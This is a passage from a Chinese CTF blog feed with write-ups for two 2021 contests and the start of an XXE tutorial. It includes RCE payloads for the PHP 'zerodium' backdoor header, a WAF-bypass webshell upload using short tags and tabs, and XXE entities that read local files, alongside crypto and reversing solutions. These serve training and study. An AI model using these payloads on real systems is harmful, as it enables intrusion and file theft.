$a,b,c$，展开化简为：</p><p>$a^3+b^3+c^3-5(a^2b+ab^2+a^2c+ac^2+b^2c+bc^2)-9abc=0$</p><p>结合引用论文 <a href="http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf">An unusual cubic representation problem</a>，将方程映射到二维空间，即 $(a,b,c) \rightarrow (x,y)$。</p><p>$(a,b,c) \rightarrow (x,y)$ 映射关系式：</p><p>$\begin{cases} x=\cfrac{-4(a+b+2c)(N+3)}{(2a+2b-c)+(a+b)N}=\cfrac{-36(a+b+2c)}{8a+8b-c} \\ y=\cfrac{4(a-b)(N+3)(2N+5)}{(2a+2b-c)+(a+b)N}=\cfrac{612(a-b)}{8a+8b-c} \end{cases}$</p><p>取 $(a,b,c)=(1,-1,0)$，得到椭圆曲线的Weierstrass形式方程：</p><p>$E_6:y^2=x^3+(4N^2+12N-3)x^2+32(N+3)x=x^3+213x^2+288x$</p><p>在曲线上易取出基点 $G$ 作为初始点，根据不定方程的 $(ka,kb,kc)$ 通解特性，可分别将基点 $G$ 数乘得到 $2G,3G,\cdots$，再分别通过关系式映射回 $(a,b,c)$，以条件判断 $a&gt;0,b&gt;0,c&gt;0$，得到的 $(a,b,c)$ 即为不定方程的正整数解。</p><p>$(x,y) \rightarrow (a,b,c)$ 映射关系式：</p><p>$\begin{cases} \cfrac{a}{a+b+c}=\cfrac{8(N+3)-x+y}{2(4-x)(N+3)} \\ \cfrac{b}{a+b+c}=\cfrac{8(N+3)-x-y}{2(4-x)(N+3)} \\ \cfrac{c}{a+b+c}=\cfrac{-4(N+3)-(N+2)x}{(4-x)(N+3)} \end{cases}$</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">ee = EllipticCurve([<span class="number">0</span>, <span class="number">4</span>*<span class="number">6</span>^<span class="number">2</span>+<span class="number">12</span>*<span class="number">6</span>-<span class="number">3</span>, <span class="number">0</span>, <span class="number">32</span>*(<span class="number">6</span>+<span class="number">3</span>), <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(ee)</span><br><span class="line"><span class="built_in">print</span>(ee.gens())</span><br><span class="line"></span><br><span class="line">P = ee(-<span class="number">200</span>,<span class="number">680</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orig</span>(<span class="params">P,N</span>):</span></span><br><span class="line">    x = P[<span class="number">0</span>]</span><br><span class="line">    y = P[<span class="number">1</span>]</span><br><span class="line">    a = (<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    b = (<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    c = (-<span class="number">4</span>*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    da = denominator(a)</span><br><span class="line">    db = denominator(b)</span><br><span class="line">    dc = denominator(c)</span><br><span class="line">    l = lcm(da,lcm(db,dc))</span><br><span class="line">    <span class="keyword">return</span> [a*l, b*l, c*l]</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    u = orig(k*P, <span class="number">6</span>) </span><br><span class="line">    (a,b,c) = (u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">if</span> a&gt;<span class="number">0</span> <span class="keyword">and</span> b&gt;<span class="number">0</span> <span class="keyword">and</span> c&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">        <span class="built_in">print</span>(a/(b+c)+b/(a+c)+c/(a+b))</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        ans.append((a,b,c))</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment">#len(ans)=8</span></span><br></pre></td></tr></table></figure><p>再通过pwntools与环境交互得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;8.140.152.226&#x27;</span>,<span class="number">27359</span>)</span><br><span class="line">my = [...]</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] x: &#x27;</span>,<span class="built_in">str</span>(my[i][<span class="number">0</span>]))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] y: &#x27;</span>,<span class="built_in">str</span>(my[i][<span class="number">1</span>]))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] z: &#x27;</span>,<span class="built_in">str</span>(my[i][<span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><p><code>flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125;</code></p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="redemption-code"><a href="#redemption-code" class="headerlink" title="redemption_code"></a>redemption_code</h3><blockquote><p>所谓的虐心手游，连发的兑换码都这么复杂。</p></blockquote><p>反编译看<code>main()</code>函数，输入字符串<code>key</code>分别经过两次处理：</p><p><img src="/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/image-20210403212358981.png" alt="image-20210403212358981"></p><p>第一层处理，<code>pre()</code>函数：</p><p><img src="/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/image-20210403211907735.png" alt="image-20210403211907735"></p><p>先判断输入<code>key</code>长度<code>len(key)==14</code>，再与字符串<code>ss1=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;</code>共同作为<code>server_check_redemption_code()</code>函数参数：</p><p><img src="/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/image-20210403212645835.png" alt="image-20210403212645835"></p><p><code>server_check_redemption_code()</code>函数的核心部分，通过编写代码测试，功能为返回<code>key</code>中符合字符串<code>ss</code>子串的最大长度，<code>s</code>数组保存逐行判断得到的连续字符状态值，如整个<code>key</code>为<code>ss</code>子串，返回起始下标值<code>k-len(key)+1</code>，否则返回<code>-1</code>。</p><p>第二层处理，判断输入<code>key</code>长度<code>len(key)==14</code>，再与字符串<code>ss2=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;</code>共同作为<code>server_check_redemption_code()</code>函数参数。</p><p>第一次check，需返回值不等于<code>-1</code>进到第二次check，第二次check需返回值为<code>7</code>输出flag，即<code>key</code>既是<code>ss1</code>子串，又是<code>ss2</code>从下标7开始的子串，即共有子串<code>Ninja Must Die</code>。</p><p><strong>flag</strong></p><p><code>flag&#123;Ninja Must Die&#125;</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。</p><p>hint: 2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。</p></blockquote><p>开始在环境里翻了一圈无头绪，放hint后查找此事件才知道这是几天前的事，紧跟时事的出题人。</p><p>来龙去脉：</p><blockquote><p>3月28日，攻击者使用PHP的作者Rasmus Lerdorf和Jetbrains开发者Nikita Popov的账号，向git.php.net服务器上的 php-src 存储库推送了两次恶意提交。</p><p>经观察，在两个恶意提交中，攻击者在上游发布了一个假装成修正文字输入错误的神秘修改。</p><p>攻击者以Rasmus Lerdorf的身份签署的恶意提交（非法）植入远程代码执行后门。</p><p><img src="/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/e10b3802b2ea45628fc325c4c3cf3ad8.png" alt="img"></p><p>仔细检查一下新增的第370行调用<code>zend_eval_string</code>函数的地方，可以发现，这段代码实际上是为运行被劫持的PHP版本的网站植入了一个后门，以获得轻松的远程代码执行（RCE）。</p><p>PHP的开发者表示，如果字符串以<code>zerodium</code>开头，这一行就会从<code>User-Agentt</code> HTTP头内执行PHP代码。</p><p>此外，恶意代码中包含了一条注解 “REMOVETHIS: sold to zerodium, mid 2017”。值得注意的是，Zerodium是一家知名的零日漏洞经纪商，而注释的意思是“漏洞在2017年中出售给了zerodium”。对此，Zerodium的CEO Chaouki Bekrar认为攻击者很可能试图出售这个漏洞，但找不到卖家，所以攻击者干脆自己恶搞。</p></blockquote><p>同时参考Linkedin上的一文：<a href="https://www.linkedin.com/pulse/official-php-git-server-attacked-enrico-zimuel">Official PHP Git server attacked</a>，照样构造payload，开始没注意到属性是<code>User-Agentt</code>而不是默认的<code>User-Agent</code>，百试不出…</p><p>payload（加在HTTP头）</p><p>列目录：<code>User-Agentt: zerodiumsystem(&#39;ls /&#39;);</code></p><p>读文件：<code>User-Agentt: zerodiumsystem(&#39;cat /flag&#39;);</code></p><p><strong>flag</strong></p><p><code>flag&#123;cc5dbc99-fd75-41f8-87f6-825c7e08f016&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;数字中国是十九大提出的新时代国家信息化发展的新战略。2021数字中国创新大赛，作为数字中国建设峰会“一会、一展、一赛”的重要组成部分， 将继续采取多赛道并行的竞赛形式，设置数字党建、数字政府、大数据、智慧医疗、鲲鹏计算、网络安全、集成电路设计、青少</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>红明谷杯数据安全大赛技能场景赛</title>
    <link href="https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/</id>
    <published>2021-04-02T14:23:48.000Z</published>
    <updated>2021-04-02T15:07:15.488Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>位于福建省中西部的三明市是一座有着优良革命血脉及红色精神的土地，作为曾经的中央苏区的核心区、中央红军长征的出发地、红旗不倒的革命根据地、伟人革命的重要实践地，这片红土地在数字化的今天，在打击网络犯罪，维护数字空间秩序方面同样褒有红色的先进性。结合数字中国峰会，开创网络安全赛事红色品牌——“红明谷”杯，将“风展红旗如画”延伸至网络安全领域，与全国各界网络精英一同打造网络空间的红色安全保卫基地。</p><p>本届大赛将创新通过安全意识赛、技能场景赛、揭榜挑战赛等多种竞赛模式，综合考察社会公众、党政机关、行业单位、科研院校等社会各界的网络安全理论及实践应用水平，促进网络实战，建立红色防线，解决实际问题，立体化提升参赛各方网络空间数字治理能力。</p><p><a href="https://www.ichunqiu.com/hmgctf">https://www.ichunqiu.com/hmgctf</a></p><p>​    </p><p>报了名，因工作日没怎么参加，下午抽空做了两题。</p><p>Rank: 80+</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>一起来参与数据安全知识小竞赛。</p></blockquote><p>答题拿flag。</p><p>​    </p><h3 id="歪比歪比"><a href="#歪比歪比" class="headerlink" title="歪比歪比"></a>歪比歪比</h3><blockquote><p>戴夫发送了一些信息给僵尸，但是被我截获到了。看看能从里边发现什么?好像是一个Surprise，你来翻译翻译?</p></blockquote><p>流量包里套着哈夫曼编码题，根据词频解码01串。</p><p>正要解出，到时间了。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h3><blockquote><p>Chinese Remainder Theorem is fantastic</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_flag</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line">nl = []</span><br><span class="line">el = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">5</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.next_prime(bytes_to_long(flag))</span><br><span class="line">    e = gmpy2.invert(d, phi)</span><br><span class="line">    nl.append(n)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(nl)</span><br><span class="line"><span class="built_in">print</span>(el)</span><br><span class="line"></span><br><span class="line">cl = []</span><br><span class="line">flag = shuffle_flag(flag.decode()).encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nl)):</span><br><span class="line">    cl.append(<span class="built_in">pow</span>(bytes_to_long(flag), el[i], nl[i]))</span><br><span class="line"><span class="built_in">print</span>(cl)</span><br></pre></td></tr></table></figure></blockquote><p>五组 $n,e$，共私钥 $d$，用LLL算法打。发现 $n$ 都已帮从小到大排好序，一步到位。</p><p>由于 <code>d = gmpy2.next_prime(bytes_to_long(flag))</code>，求出 $d$ 后往回遍历拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">4</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line">a[<span class="number">0</span>] = [M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>]]</span><br><span class="line">a[<span class="number">1</span>] = [<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>] = [<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL = Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>]) // M</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1500</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(d-k)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><blockquote><p>万无一失的waf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>简单RCE。</p><p>先用 <code>?action=pwd</code> 得到所在目录，再用 <code>?action=upload&amp;data=xxx</code> 写PHP代码。</p><p><code>waf()</code>函数过滤了<code>php</code> 和 空格，用短标签和 <code>%09</code> 即可绕过。</p><p> <code>?action=upload&amp;data=&lt;?=`ls%09/`?&gt;</code> 读根目录，发现文件 <code>!whatyouwantggggggg401.php</code>，</p><p><code>?action=upload&amp;data=&lt;?=`tac%09/!whatyou*`?&gt;</code> 读文件，访问sandbox目录查看源码得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;位于福建省中西部的三明市是一座有着优良革命血脉及红色精神的土地，作为曾经的中央苏区的核心区、中央红军长征的出发地、红旗不倒的革命根据地、伟人革命的重要实践地，这片红土地在数字化的今天，在打击网络犯罪，维护数字空间秩序方面同样褒有红色的先进性。结合数</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://lazzzaro.github.io/2021/03/01/web-XXE/"/>
    <id>https://lazzzaro.github.io/2021/03/01/web-XXE/</id>
    <published>2021-03-01T10:27:23.000Z</published>
    <updated>2022-03-01T13:52:41.607Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>XML是一种非常流行的标记语言，用于配置文件。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。</p><p><strong>XXE（XML External Entity，外部实体）</strong>，从安全角度理解成 XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><hr><p>​    </p><h2 id="基本格式（外部实体）"><a href="#基本格式（外部实体）" class="headerlink" title="基本格式（外部实体）"></a>基本格式（外部实体）</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通用实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 参数实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">an-element</span> <span class="meta-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote-dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><ul><li><p><strong>常规</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span 